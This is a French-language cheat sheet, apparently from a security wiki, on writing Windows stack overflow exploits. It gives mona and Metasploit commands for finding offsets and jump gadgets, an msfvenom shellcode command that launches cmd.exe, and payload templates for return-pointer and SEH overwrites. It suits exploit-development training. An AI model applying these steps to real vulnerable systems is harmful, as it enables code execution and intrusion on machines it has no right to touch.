---
title: Ecriture d'exploit
permalink: /Ecriture_d'exploit/
---

# Ecrite d'exploit

T0D0
----

-   Identification automatisée des bad chars
-   Fuzzing

Registres
---------

Les différents registres présents sont:

``` text
EAX - Main register used in arithmetic calculations. Also known as accumulator, as it holds results
      of arithmetic operations and function return values.
EBX - The Base Register. Pointer to data in the DS segment.  Used to store the base address of the
      program.
ECX - The Counter register is often used to hold a value representing the number of times a process
      is to be repeated. Used for loop and string operations.
EDX - A general purpose registers. Also used for I/O operations. Helps extend EAX to 64-bits.
ESI - Source Index register. Pointer to data in the segment pointed to by the DS register.  Used as
      an offset address in string and array operations. It holds the address from where to read data.
EDI - Destination Index register. Pointer to data (or destination) in the segment pointed to by the
      ES register.  Used as an offset address in string and array operations. It holds the implied
      write address of all string operations.
EBP - Base Pointer. Pointer to data on the stack (in the SS segment).  It points to the bottom of the
      current stack frame. It is used to reference local variables.
ESP - Stack Pointer (in the SS segment). It points to the top of the current stack frame. It is used
      to reference local variables.
EIP - Instruction Pointer (holds the address of the next instruction to be executed)
```

Saved Return Pointer Overflows
------------------------------

Génération d'un pattern metasploit:

``` bash
pattern_create.rb 10000 >> pattern_10000
```

Identification de l'offset (méthode automatisée avec mona)

``` text
!mona findmsp
```

Méthode manuelle (après avoir récupéré la valeur d'EIP) avec metasploit:

``` bash
pattern_offset.rb 76483676
[*] Exact match at offset 6109
```

Méthode manuelle (après avoir récupéré la valeur d'EIP) avec mona:

``` text
!mona pattern_offset 43386F43
!mona po 43386F43
```

Identification d'un 'jmp' vers le registre visé:

``` text
!mona jmp -r esp #jmp vers esp
```

Génération d'un shellcode faisant apparaîte cmd.exe:

``` bash
msfvenom -p windows/exec CMD=cmd.exe -f py --bad-chars "\x00\x0d\x0a"
```

Le payload final aura la forme suivante:

``` python
# [JUNK][EIP][NOP_SLED][SHELLCODE]
payload = 'A' * offset + ret_addr + '\x90' * 100 + buf
```

Structured Exception Handler (SEH)
----------------------------------

Génération d'un pattern metasploit:

``` bash
pattern_create.rb 10000 >> pattern_10000
```

Identification de l'offset (méthode automatisée avec mona):

``` text
!mona findmsp
```

Afficher le contenu des enregistrements SEH:

``` text
!mona exchain
```

Trouver des instructions 'pop pop ret':

``` text
!mona seh
```

Saut de 6 bytes (saute deux NOP et l'adresse du pop pop ret):

``` text
\xEB\x06\x90\x90
```

Le payload final aura la forme suivante:

``` python
# [JUNK][nSEH][SEH][NOP_SLED][SHELLCODE]
payload = 'A' * offset + jmp_esp + ret_addr + '\x90' * 100 + buf
```

Références
----------

-   [Fuzzy Security - Exploit Development](https://www.fuzzysecurity.com/tutorials/expDev/1.html)
-   [Awesome Windows Exploitation](https://github.com/enddo/awesome-windows-exploitation)


